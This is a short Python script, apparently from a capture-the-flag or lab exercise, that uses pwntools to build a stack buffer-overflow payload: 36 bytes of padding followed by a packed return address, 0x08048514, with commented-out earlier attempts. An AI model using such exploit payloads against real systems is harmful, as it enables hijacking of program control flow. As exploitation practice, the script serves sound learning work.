from pwn import *

payload = b'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII'#JJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz111122223333444455556666777788889999'
# payload += '\x14\x85\x04\x08'
# payload += '\x00\x00\x00\x00'
payload += p32(0x08048514)
print(payload)
# 0x08048514